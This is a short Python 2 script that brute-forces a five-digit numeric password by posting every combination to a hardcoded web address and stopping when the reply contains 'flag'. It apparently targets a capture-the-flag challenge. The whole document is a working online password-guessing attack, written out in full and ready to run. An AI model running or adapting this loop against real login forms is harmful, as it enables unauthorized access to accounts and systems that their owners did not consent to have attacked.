# coding:utf-8
import sys

import itertools
import requests

reload(sys)
sys.setdefaultencoding("utf-8")

url = 'http://120.24.86.145:8002/baopo/?yes'
s = requests.session()

chars = '0123456789'
print "cracking....."
for t in itertools.product(chars, repeat=5):
    w = ''.join(t)
    data = {'pwd': w}
    r = s.post(url, data=data)
    if 'flag' in r.text.encode('utf-8'):
        print "password is %s" % w
        print r.text.encode('utf-8')
        break
